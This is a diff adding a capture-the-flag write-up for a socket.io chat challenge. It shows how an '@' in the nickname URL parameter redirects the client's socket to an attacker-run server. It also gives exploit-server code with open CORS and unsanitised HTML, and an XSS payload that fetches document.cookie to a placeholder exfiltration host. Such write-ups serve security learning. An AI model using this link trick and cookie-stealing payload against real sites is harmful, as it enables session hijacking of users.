@@ -36,8 +36,31 @@ socket.on('msg', msg => {
     });
 ```
 
-## Solution
+### Solution
 
 - Having an @ in our parameter. Everything before the @ is considered to be the username on the domain. http://127.0.0.1:58000/?nickname=@example.com/&room=DOMPurify is parsed as the domain example.com/&room=DOMPurify for the socket connection. At the same time, the get parameter room=DOMPurify allows us to still get into the innerHTML region in the client-side line of code
 
 This makes socket.io connect to the attackers server while using room=DOMPurify as query parameetr.
+
+## Creating exploit server
+To do this we can just take the webserver code
+1) Add these lines to accept connection cross-domain:
+```
+io.engine.on("headers", (headers, req) => {
+headers["Access-Control-Allow-Origin"] = "*";
+});
+```
+2) Remove the sanitazation of the message
+```
+ io.to(room).emit('msg', {
+              from: msg.from,
+              text: msg.text,
+              isHtml: true
+          });
+```
+
+## Sending the payload
+
+1) Send our malicious link ```http://[chat_server]:58000/?nickname=x@[exploit_ip]:1231/?&room=DOMPurify```
+2) Send an xss payload to get the cookies, such as ```<img src=x onerror="fetch('https://[exfil server]/'+btoa(document.cookie))">```
+And we obtain the flag
